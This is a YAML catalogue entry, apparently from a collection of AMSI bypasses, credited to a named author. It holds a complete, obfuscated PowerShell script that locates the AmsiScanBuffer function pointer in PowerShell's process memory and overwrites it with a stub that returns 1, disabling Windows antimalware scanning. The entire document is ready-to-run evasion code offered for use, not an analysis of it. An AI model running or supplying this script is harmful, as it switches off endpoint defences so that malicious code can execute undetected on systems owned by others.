name: ecfirstAMSI-ScanBuff
authors:
  - name: Ben Miller
    handle: '@secur3'
    link: www.ecfirst.com
description: |
  AMSI bypass via function replace
comments:
  - adopted from the interwebs
language: powershell
min_language_version: '3'
script: |
  function tryMe{param($iStart=327680,$nOffset=327680,$mOffset=16777216,$redB=327680);$calls='using System;using System.ComponentModel;using System.Management.Automation;using System.Reflection;using System.Runtime.CompilerServices;using System.Runtime.InteropServices;using System.Text;public class calls{[DllImport("kernel32.dll")]public static extern bool ReadProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,UInt32 nSize,ref UInt32 lpNumberOfBytesRead);[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();[DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true,SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);[MethodImpl(MethodImplOptions.NoOptimization|MethodImplOptions.NoInlining)]public static int Denny(){return 1;}}';Add-Type $calls;$Idat=Get-Date;$mystr='goodby, planet';$mystr=$mystr.replace('go','a');$mystr=$mystr.replace('od','m');$mystr=$mystr.replace('by,','s');$mystr=$mystr.replace(' ','i');$mystr=$mystr.replace('pla','.d');$mystr=$mystr.replace('net','ll');$mystr2='goodby, planet';$mystr2=$mystr2.replace('go','A');$mystr2=$mystr2.replace('od','m');$mystr2=$mystr2.replace('by,','s');$mystr2=$mystr2.replace(' ','i');$mystr2=$mystr2.replace('pla','Sc');$mystr2=$mystr2.replace('net','an');$mystr3='goodby, planet';$mystr3=$mystr3.replace('goodby','Bu');$mystr3=$mystr3.replace(', ','ff');$mystr3=$mystr3.replace('planet','er');$Address=[calls]::GetModuleHandle($mystr);$t1="Ge";$t2="tPro";$t3="cAdd";$t4="ress";$t5=$t1+$t2+$t3+$t4;[IntPtr]$funcAddr=[calls]::$t5($Address,$mystr2+$mystr3);$Assemblies=[appdomain]::currentdomain.getassemblies();$Assemblies|ForEach-Object{if($_.Location -ne $null){$split1=$_.FullName.Split(",")[0];If($split1.StartsWith('S')-And $split1.EndsWith('n')-And $split1.Length -eq 28){$Types=$_.GetTypes()}}};$Types|ForEach-Object{if($_.Name -ne $null){If($_.Name.StartsWith('A')-And $_.Name.EndsWith('s')-And $_.Name.Length -eq 9){$Methods=$_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')}}};$Methods|ForEach-Object{if($_.Name -ne $null){If($_.Name.StartsWith('S')-And $_.Name.EndsWith('t')-And $_.Name.Length -eq 11){$MethodFound=$_}}};[IntPtr]$myPt=$MethodFound.MethodHandle.GetFunctionPointer();[IntPtr]$hands=[calls]::GetCurrentProcess();$danny=0;$apRet=$false;:initialloop for($j=$iStart;$j -lt $mOffset;$j+=$nOffset){[IntPtr]$myPtToSearch=[Int64]$myPt - $j;$rMemAr=[byte[]]::new($redB);$apRet=[calls]::ReadProcessMemory($hands,$myPtToSearch,$rMemAr,$redB,[ref]$danny);for($i=0;$i -lt $rMemAr.Length;$i+=1){$bytes=[byte[]]($rMemAr[$i],$rMemAr[$i+1],$rMemAr[$i+2],$rMemAr[$i+3],$rMemAr[$i+4],$rMemAr[$i+5],$rMemAr[$i+6],$rMemAr[$i+7]);[IntPtr]$pTOc=[bitconverter]::ToInt64($bytes,0);if($pTOc -eq $funcAddr){[IntPtr]$memTp=[Int64]$myPtToSearch + $i;break initialloop}}};[IntPtr]$dannyPointer=[calls].GetMethod('Denny').MethodHandle.GetFunctionPointer();$buf=[IntPtr[]]($dannyPointer);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$memTp,1);} tryMe
